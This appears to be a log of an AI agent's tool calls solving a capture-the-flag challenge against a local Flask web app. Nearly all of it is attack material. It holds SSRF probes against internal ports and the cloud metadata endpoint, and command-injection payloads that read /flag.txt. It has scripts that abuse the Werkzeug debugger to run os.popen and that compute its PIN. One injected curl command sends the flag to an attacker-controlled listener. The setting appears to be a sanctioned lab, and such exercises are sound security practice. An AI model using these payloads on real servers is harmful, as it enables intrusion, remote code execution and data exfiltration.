curl -s -X POST http://localhost:5003/add_url -d "url=http://127.0.0.1:5003/internal" -H "Content-Type: application/x-www-form-urlencoded"
curl -s -X POST http://localhost:5003/add_url -d "url=http://127.0.0.1:5003/api" -H "Content-Type: application/x-www-form-urlencoded"
curl -s -X POST http://localhost:5003/add_url -d "url=http://127.0.0.1:5003/debug" -H "Content-Type: application/x-www-form-urlencoded"

# Try cloud metadata endpoint
curl -s -X POST http://localhost:5003/add_url -d "url=http://169.254.169.254/latest/meta-data/" -H "Content-Type: application/x-www-form-urlencoded"

# See verbose error messages
curl -s -X POST http://localhost:5003/add_url -d "url=invalid-url" -H "Content-Type: application/x-www-form-urlencoded"

# Try gopher protocol 
curl -s -X POST http://localhost:5003/add_url -d "url=gopher://127.0.0.1:5003/" -H "Content-Type: application/x-www-form-urlencoded"

for port in 22 80 443 3000 4000 5000 6000 8000 8080 9000; do 
  result=$(curl -s -X POST http://localhost:5003/add_url -d "url=http://127.0.0.1:$port/" -H "Content-Type: application/x-www-form-urlencoded")
  echo "Port $port: $result"
done

# Try URL with redirect
curl -s -X POST http://localhost:5003/add_url -d "url=http://httpbin.org/redirect-to?url=file:///etc/passwd" -H "Content-Type: application/x-www-form-urlencoded"

# Try @ symbol bypass
curl -s -X POST http://localhost:5003/add_url -d "url=http://example.com@127.0.0.1:5003/" -H "Content-Type: application/x-www-form-urlencoded"

# Try path traversal
curl -s -X POST http://localhost:5003/add_url -d "url=http://127.0.0.1:5003/../../../etc/passwd" -H "Content-Type: application/x-www-form-urlencoded"

# Test if there's a /flag endpoint accessible only internally
for endpoint in flag admin_flag get_flag secret_flag internal_flag getflag secretflag; do
  result=$(curl -s -X POST http://localhost:5003/add_url -d "url=http://example.com@127.0.0.1:5003/$endpoint" -H "Content-Type: application/x-www-form-urlencoded")
  echo "$endpoint: $result"
done
args.description: Try various flag endpoints via SSRF

args.command:
# Try command injection with backticks
curl -s -X POST http://localhost:5003/add_url -d 'url=http://example.com/`cat flag.txt`' -H "Content-Type: application/x-www-form-urlencoded"

# Try command injection with $()
curl -s -X POST http://localhost:5003/add_url -d 'url=http://example.com/$(cat flag.txt)' -H "Content-Type: application/x-www-form-urlencoded"

# Try pipe injection
curl -s -X POST http://localhost:5003/add_url -d 'url=http://example.com|cat flag.txt' -H "Content-Type: application/x-www-form-urlencoded"

# Set up a simple listener
python3 -m http.server 9999 &
sleep 1
# Try to make the server call our listener with data
curl -s -X POST http://localhost:5003/add_url -d 'url=http://127.0.0.1:9999/test' -H "Content-Type: application/x-www-form-urlencoded"
sleep 1
pkill -f "http.server 9999"
args.description: Test if we can make the server send requests to our listener

args.command:
# First, let me re-trigger the error to get fresh frame IDs and then try to use them
curl -s -X POST http://localhost:5003/add_url -d "url=http://example.com%00test" -H "Content-Type: application/x-www-form-urlencoded" 2>&1 | grep -oP 'id="frame-\K[0-9]+' | head -5

# Use a Python script to properly interact with the debugger
cat > /home/smartdatayb/claudecode-ctf/exploit.py << 'EOF'
import requests
import re

# First trigger the error to get fresh frame IDs
url = "http://localhost:5003/add_url"
data = {"url": "http://example.com\x00test"}
response = requests.post(url, data=data)

# Extract frame IDs
frame_ids = re.findall(r'id="frame-(\d+)"', response.text)
secret = "3MJkED3VixHkIua47qUK"

print(f"Found frame IDs: {frame_ids}")
print(f"Secret: {secret}")

# Try to execute code in each frame
for frame_id in frame_ids:
    try:
        # Try the eval endpoint
        eval_url = f"http://localhost:5003/?__debugger__=yes&cmd=eval&frm={frame_id}&s={secret}"
        cmd = "__import__('os').popen('cat /flag.txt').read()"
        
        # Try POST
        try:
            r = requests.get(eval_url, params={"tb": cmd})
            print(f"Frame {frame_id} GET result: {r.text[:500]}")
        except Exception as e:
            print(f"Frame {frame_id} GET error: {e}")
            
    except Exception as e:
        print(f"Frame {frame_id} error: {e}")
EOF

args.command:
# Write a script to try to calculate the Werkzeug PIN
cat > /home/smartdatayb/claudecode-ctf/pin_calc.py << 'EOF'
import hashlib
from itertools import chain
import requests
import re

def get_pin(username, modname, appname, modpath, uuid, machine_id):
    """
    Calculate Werkzeug debugger PIN
    """
    probably_public_bits = [
        username,
        modname,
        appname,
        modpath,
    ]

    private_bits = [
        str(uuid),
        machine_id,
    ]

    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode("utf-8")
        h.update(bit)
    h.update(b"cookiesalt")

    cookie_name = f"__wzd{h.hexdigest()[:20]}"

    num = None
    if num is None:
        h.update(b"pinsalt")
        num = f"{int(h.hexdigest(), 16):09d}"[:9]

    rv = None
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = "-".join(
                    num[x : x + group_size].rjust(group_size, "0")
                    for x in range(0, len(num), group_size)
                )
                break
        else:
            rv = num

    return rv

# Try common combinations
usernames = ['root', 'web', 'www-data', 'flask', 'app', 'nobody', 'ctf']
modname = 'flask.app'  
appname = 'Flask'
modpaths = [
    '/app/app.py',
    '/app/main.py',
    '/app/server.py',
    '/home/app/app.py',
    '/usr/src/app/app.py',
    '/opt/app/app.py',
]

# We need to find UUID (MAC address) and machine_id
# Common machine_id locations: /etc/machine-id, /proc/sys/kernel/random/boot_id
# MAC can be found in /sys/class/net/eth0/address

print("Attempting to calculate PIN with common values...")
print("Note: We need to discover the actual values through SSRF or other means")

# Test some PINs
for username in usernames:
    for modpath in modpaths:
        # Test with some common UUID/machine_id patterns
        pin = get_pin(username, modname, appname, modpath, "2485377892354", "e3c1a0d2c6f04d0f9c8e5b7a3d2c1e0f")
        print(f"user={username}, path={modpath} -> PIN: {pin}")
EOF

import requests
import urllib.parse
import re

# First, trigger an error to get a frame ID
print("[*] Triggering error to get frame IDs...")
response = requests.post("http://localhost:5003/add_url", data={"url": "http://example.com\x00test"})
frame_ids = re.findall(r'id="frame-(\d+)"', response.text)
secret = "3MJkED3VixHkIua47qUK"

print(f"[*] Found {len(frame_ids)} frame IDs")
print(f"[*] Frame IDs: {frame_ids[:3]}...")
print(f"[*] Secret: {secret}")

# Try to access the debugger eval via SSRF
for frame_id in frame_ids[:5]:
    # The key insight is that we can make the server request itself
    # and the PIN might not be checked for localhost requests
    
    # Try constructing URL to execute code
    cmd = "__import__('os').popen('cat /flag*').read()"
    encoded_cmd = urllib.parse.quote(cmd)
    
    # Different variations of the debugger endpoint
    urls_to_try = [
        f"http://127.0.0.1:5003/console?__debugger__=yes&cmd=eval&frm={frame_id}&s={secret}&code={encoded_cmd}",
        f"http://127.0.0.1:5003/?__debugger__=yes&cmd=eval&frm={frame_id}&s={secret}",
    ]
    
    for debug_url in urls_to_try:
        print(f"\n[*] Trying SSRF to: {debug_url[:80]}...")
        try:
            # Use SSRF to access this URL
            result = requests.post("http://localhost:5003/add_url", data={"url": debug_url})
            print(f"Result: {result.json()}")
        except Exception as e:
            print(f"Error: {e}")
EOF

args.command:
# Set up a simple listener to receive the flag
cat > /home/smartdatayb/claudecode-ctf/listener.py << 'EOF'
from flask import Flask, request
app = Flask(__name__)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
    print(f"Received request:")
    print(f"  Path: {path}")
    print(f"  Args: {request.args}")
    print(f"  Data: {request.data}")
    return "OK"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=9998, debug=True)
EOF

# Start listener in background
/home/smartdatayb/claudecode-ctf/venv/bin/python /home/smartdatayb/claudecode-ctf/listener.py &
LISTENER_PID=$!
sleep 2

# Get my IP

echo "My IP: $MY_IP"

# Try to send the flag to our listener

curl -s -X POST http://localhost:5003/add_url --data-urlencode "url=\"; curl http://$MY_IP:9998/\$(cat /flag.txt); curl \"http://example.com" -H "Content-Type: application/x-www-form-urlencoded"

sleep 2

# Check what was received
echo "---"
echo "Killing listener..."
kill $LISTENER_PID 2>/dev/null

args.command:
# Start listener again with more verbose output
cat > /home/smartdatayb/claudecode-ctf/listener2.py << 'EOF'
from http.server import HTTPServer, BaseHTTPRequestHandler
import sys

class Handler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        print(f"{args[0]}")
    
    def do_GET(self):
        print(f"GET {self.path}")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")
    
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length)
        print(f"POST {self.path}")
        print(f"Body: {body}")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

print("Starting server on port 9998...")
HTTPServer(('0.0.0.0', 9998), Handler).serve_forever()
EOF

# Start listener
/home/smartdatayb/claudecode-ctf/venv/bin/python /home/smartdatayb/claudecode-ctf/listener2.py &

echo "$result"

echo ""
echo "=== Test 2: Try cat with the same pattern ==="
result=$(curl -s -X POST http://localhost:5003/add_url --data-urlencode 'url=http://example.com"; cat /flag.txt; curl "http://example.com' -H "Content-Type: application/x-www-form-urlencoded")
echo "$result"

echo ""
echo "=== Test 3: Echo test ==="
result=$(curl -s -X POST http://localhost:5003/add_url --data-urlencode 'url=http://example.com"; echo INJECTED; curl "http://example.com' -H "Content-Type: application/x-www-form-urlencoded")
echo "$result"
args.description: Verify injection and test cat command
